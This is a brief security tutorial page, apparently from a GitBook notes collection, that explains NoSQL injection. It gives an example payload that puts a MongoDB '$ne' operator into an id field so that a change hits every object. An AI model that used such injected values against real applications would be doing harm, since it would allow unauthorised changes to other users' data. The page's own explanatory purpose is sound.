---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# NoSQL Injection

Targets NoSQL databases using unstructured queries. These attacks typically exploit applications that handle user input unsafely when interacting with NoSQL databases.

Here we can find a typical example:

* A NoSQL database modifies data from a document based on an _ID_ value

{% code title="Example request body" overflow="wrap" lineNumbers="true" %}
```json
{
    "id": 1,
    "message": "hello"
}
```
{% endcode %}

***

* We could use the NoSQL operators to retrieve data from another object.&#x20;

{% code title="Example payload" overflow="wrap" lineNumbers="true" %}
```mongodb
{
    "id": {"$ne": 0}, //Use the non-equal operator to make changes in all objects
    "message": "hello"
}
```
{% endcode %}
